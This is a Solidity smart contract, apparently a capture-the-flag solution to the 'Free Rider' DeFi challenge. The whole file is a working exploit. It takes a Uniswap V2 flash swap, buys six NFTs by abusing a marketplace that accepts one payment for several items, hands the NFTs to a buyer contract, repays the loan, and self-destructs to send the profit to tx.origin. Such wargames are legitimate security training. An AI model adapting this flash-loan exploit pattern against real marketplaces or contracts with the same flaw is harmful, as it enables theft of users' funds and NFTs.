// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {

    address attacker;
    IUniswapV2Pair uniswapPair;
    IFreeRiderNFTMarketplace nftMarketplace;
    IWETH weth;
    IERC721 nft;
    address freeRiderBuyer;
    constructor(IUniswapV2Pair _pair, IFreeRiderNFTMarketplace _nftmarket, IWETH _weth, address _buyer) {
        attacker = msg.sender;
        uniswapPair = _pair;
        nftMarketplace = _nftmarket;
        weth = _weth;
        nft = _nftmarket.token();
        freeRiderBuyer = _buyer;
    }

    function exploit(uint amount) public {
        uniswapPair.swap(amount, 0, address(this), "00");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        console.log("sender: ", sender);
        console.log("amount0: ", amount0);
        console.log("amount1: ", amount1);
        console.log("before withdraw balance: ", address(this).balance);
        console.log("weth balance: ", address(weth).balance);
        weth.withdraw(amount0);
        uint256 fee = ((amount0 * 3) / 997) + 1;
        uint256 amountToRepay = amount0 + fee;

        console.log("after withdraw balance balance: ", address(this).balance);

        uint256[] memory tokenIds = new uint256[](6);

        for(uint i = 0; i < tokenIds.length; i++){
            tokenIds[i] = i;
        }

        nftMarketplace.buyMany{value: amount0}(tokenIds);

        for(uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer , i, abi.encode(tx.origin));
        }

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);

        selfdestruct(payable(tx.origin));

    }


    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}